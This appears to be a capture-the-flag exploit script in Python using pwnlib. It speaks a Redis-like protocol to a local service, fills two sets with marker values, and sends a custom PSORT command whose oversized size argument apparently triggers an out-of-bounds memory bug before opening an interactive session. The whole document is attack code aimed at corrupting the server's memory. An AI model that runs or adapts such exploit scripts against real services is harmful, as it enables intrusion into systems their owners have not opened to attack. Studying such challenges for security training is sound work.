from pwnlib import *

def make_int(n):
	return chr(0x24 + 22) + str(n) + "\n"

def make_string(s):
	assert len(s) <= 0x1000
	assert "\n" not in s
	return chr(0x24 + 0) + str(len(s)) + "\n" + s + "\n"

def make_array(l):
	return chr(0x24 + 6) + str(len(l)) + "\n" + "".join(l)


# expects items to be the result of make_array()
def newset(name, items=None):
	args = [
		make_string("NEWSET"),
		make_string(name),
	]
	if items is not None:
		args.append(items)

	s.send(make_array(args))
	s.ru("+OK\n")

def psort(name, size=None):
	args = [make_string("PSORT"), make_string(name)]
	if size is not None:
		args.append(make_int(size))

	s.send(make_array(args))
	#s.ru("+OK\n")


s = Socket(("localhost", 5553))

newset(
	"AAAA", 
	make_array([
		make_int(0x444401),
		make_int(0x444402),
		make_int(0x444403),
		make_int(0x444404),
	])
)

newset(
	"BBBB", 
	make_array([
		make_int(0x333301),
		make_int(0x333302),
	])
)

psort("BBBB", 0x10)



s.interact()
